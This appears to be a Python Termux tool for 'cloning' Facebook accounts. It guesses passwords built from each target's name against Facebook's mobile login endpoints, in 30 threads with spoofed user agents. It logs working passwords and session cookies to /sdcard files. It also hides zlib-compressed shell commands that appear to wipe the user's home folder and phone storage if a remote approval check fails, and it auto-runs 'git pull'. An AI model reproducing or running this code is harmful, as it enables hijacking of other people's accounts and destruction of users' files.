poc = random.choice(['SM-M045F', 'SM-M045F/DS','SM-T509','SM-A042F', 'SM-A042F/DS', 'SM-A042M', 'SM-A042M/DS','SM-A047F', 'SM-A047F/DS', 'SM-A047F/DSN','SM-A045F', 'SM-A045F/DS','SM-M136B', 'SM-M136B/DS',])
gtp = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
son = random.choice(['H8324', 'H8314', 'SO-05K','XQ-AU51', 'XQ-AU52','XQ-AT51', 'XQ-AT52', 'SOG01','SO-52A', 'XQ-AS52', 'XQ-AS62', 'XQ-AS72', 'A002SO, SOG02'])
redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
#------------------------#
model2="""
X676B
X687
X609
X697
X680D
X507
X605
X668
X6815B
X624 
X655F 
X689C
X608
X698
X682B
X682C
X688C
X688B
X658E
X659B
X689B
X689
X689D
X662
X662B
X675
X6812B
X6812
X6817B
X6817
X6816C
X6816
X6816D
X668C
X665B
X665E
X510
X559C
X559F
X559
X606
X606C
X606D
X623
X624B
X625C
X625D
X625B
X650D
X650B
X650C
X655C
X655D
X680B
X573B
X695C
X695D
X663B""".splitlines()

##X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

net = random.choice(['281','282','283','284','285','286','287','288','289','290','291','292','293','382','383','370','394','301','310','311','319','350','378','360','344'])
fbbv = str(random.randint(111111111,999999999))
   
def randomua():
	END =f'[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.25.96;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/'+'{density=2.75,width=1080,height=2216};FBOP/1;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua
    
"""Mozilla/5.0 (Linux; Android 12; Infinix X6825 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.150 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/441.0.0.32.109;]"""
#Dalvik/2.1.0 (Linux; U; Android 9; Infinix X6810 Build/) [FBAN/FB4A;FBAV/265.0.0.24.93;FBBV/260487317;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/836331581;FBCR/IND airtel;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X6810;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]
#------------#
sys.stdout.write('\x1b]2; AXY\x07')        
#_______#      
F="\033[38;5;47;1m"
G="\033[38;5;48;1m"
H="\033[38;5;49;1m"
R="\033[38;5;196m"
W="\033[1;37m"
B="\033[1;34;1m"
V="\033[38;5;39m"
Y="\033[1;33m"
X="\033[38;5;208m"
logo = (f"""  
             > 𝘗𝘖𝘞𝘌𝘙𝘌𝘋 𝘉𝘠 𝘈𝘟𝘠
 
{F}          █████  ██   ██ ██    ██ 
{G}         ██   ██  ██ ██   ██  ██  
{G}         ███████   ███     ████   
 {F}        ██   ██  ██ ██     ██    
 {H}        ██   ██ ██   ██    ██ {W}
 \033[1;34m─────────────────────────────────────────────{W}
  {F}[●]{F} AUTHOR   {R}●{F} YASIN ARAFAT{W}
  {G}[●]{G} FACEBOOK {R}●{G} YASIN ARAFAT{W}
  {H}[●]{H} VERSION  {R}●{H} TEST{W}
 \033[1;34;1m─────────────────────────────────────────────\033[1;37;1m""")
def linex():
        print(f' \033[1;34m─────────────────────────────────────────────\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
os.system('git pull')
def fucked():
	print(' Server Loadin.......')
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' Fuck You Bypass User ');exit()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "᯾".join(uuid)
	server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
			msg = str(os.geteuid())
			fucked()
	except:
			sys.exit()
			
def Fof():
	clear()
	#ckx()
	print(f"  {H}[A] FILE CLONEING{W} ")
	print(f"  {H}[B] RANDOM CLONEING ")
	#print(f" [3] Gmail Cloning")
	print(f"  {H}[x] EXIT{W}")
	linex()
	me=input(f' {H} [✓] CHOICE ● ')
	if me in ["2", "B"]:
		clear()
		print(f'  {R}[●] COMEING SOON ');time.sleep(10)
		exit()
	if me in ["x","X"," X"]:
		clear()
		exit(f'{F}{G}{H}  [√] THANKS FRIEND USEING MY TOOLS {W}')
     
	#if me in ["3","03"]:
		#gml()
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' {H} [✓] PUT FILE NAME ❯ ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' {R}[X] File location Not Found ')
			exit()
		clear()
		print(f'{G}{H}  [A] METHOD {R}❯{H} MIX ID \n  [B] METHOD {R}❯{H} MEXICO ID \n  [C] METHOD {R}❯{H} INDIA ID \n  [D] METHOD {R}❯{H} BD ID{W} ')
		linex()
		mthd=input(f' {H} [✓] CHOICE ● ')
		plist=[]
		try:
			clear()
			ps_limit = int(input(f' {H} [●] ENTER PASSWORD LIMIT ❯ '))
		except:
			ps_limit =1
		clear()
		print(f'{H}  [●] EXAMPLE: first last ● last1234 ● last123{W}')
		linex()
		for i in range(ps_limit):
			plist.append(input(f' {H} [●] PUT PASSWORD {i+1} ❯ '))
		clear()
		print(f'  {H}[●] DO YOU WENT SHOW CP IDS (Y-N): {W}')
		linex()
		cx=input(f' {H} [✓] CHOICE ● ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'{F}  [●] TOTAL ACCOUNT ❯ '+total_ids+f' \n  {G}[●] SELECT METHOD ❯ {mthd}\033[1;37m')
			print(f'{H}  [●] LIMIT OF PASS ❯ {ps_limit} {W} ')
			#print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','A']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','B']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','C']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','D']:
					crack_submit.submit(m4,ids,names,passlist)
				#elif mthd in ['5','05']:
					#crack_submit.submit(m5,ids,names,passlist)
				#elif mthd in ['6','06']:
					#crack_submit.submit(ffb4,ids,names,passlist)
				#elif mthd in ['7','07']:
					#crack_submit.submit(ffb7,ids,names,passlist)
				#elif mthd in ['8','08']:
					#crack_submit.submit(ffb8,ids,names,passlist)
				#else:
					#crack_submit.submit(m5,ids,names,passlist)
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r   {V}   [{H}YASIN{V}]{X}-{V}[{Y}%s{V}]{X}-{V}[{H}OK:%s{V}]{W}'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r {G} [ALIVE] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f' {F} [{W}COOKIES{F}]{H} : '+coki)
                                open('/sdcard/AXY_COOKIE_M1.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                open(f'/sdcard/AXY-OK-M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;33m [LOCK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/AXY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
                        
def m3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r   {V}   [{H}YASIN{V}]{X}-{V}[{Y}%s{V}]{X}-{V}[{H}OK:%s{V}]{W}'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r {G} [ALIVE] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f' {F} [{W}COOKIES{F}]{H} : '+coki)
                                open('/sdcard/AXY_COOKIE_M3.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                open(f'/sdcard/AXY-OK-M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;33m [LOCK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/AXY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r   {V}   [{H}YASIN{V}]{X}-{V}[{Y}%s{V}]{X}-{V}[{H}OK:%s{V}]{W}'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': randomua(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r {G} [ALIVE] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open('/sdcard/AXY_COOKIE_M2.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                open(f'/sdcard/AXY-OK-M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;33m [LOCKED] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/AXY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

def m4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r   {V}   [{H}YASIN{V}]{X}-{V}[{Y}%s{V}]{X}-{V}[{H}OK:%s{V}]{W}'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Fof=session.cookies.get_dict().keys()
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r {G} [ALIVE] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f' {F} [{W}COOKIE{F}]{H} : '+coki)
                                open('/sdcard/AXY_COOKIE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                open(f'/sdcard/AXY-OK-M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;33m [LOCKED] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/AXY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
#-----------[APPROVAL-DEF]----#
def main_apv():
    imt = 'AXY='
    axy = '=XD'
    os.system('clear')
    print(logo)
    try:
        key1 = open('/data/data/com.termux/files/usr/bin/.kxy-cov', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
       
        myid = uuid.uuid4().hex[:30].upper()
      #  rdx = '£'.join(myid)
        kok=open('/data/data/com.termux/files/usr/bin/.kxy-cov', 'w')
        kok.write(imt + myid)
        kok.close()
    
        

    r1 = requests.get('https://pastebin.com/GL6a5be4').text
   
    if key1 in r1:
    	Fof()
    else:
        os.system('clear')
        print(logo)
        print(f'{W}         YOUR KEY NOT DETECTED {W}')
        linex()
        print(' {H} KEY ❯ \033[1;36m' + key1)
        print(" ")
        input(' {F}{G}{H}[●] COPY KEY & PRESS ENTER FOR APPROVAL {W}')
        tks = (' THIS MY KEY ❯ '+key1);os.system('am start https://wa.me/+8801404982604?text='+tks)
        main_apv()
main_apv()

#Fof()
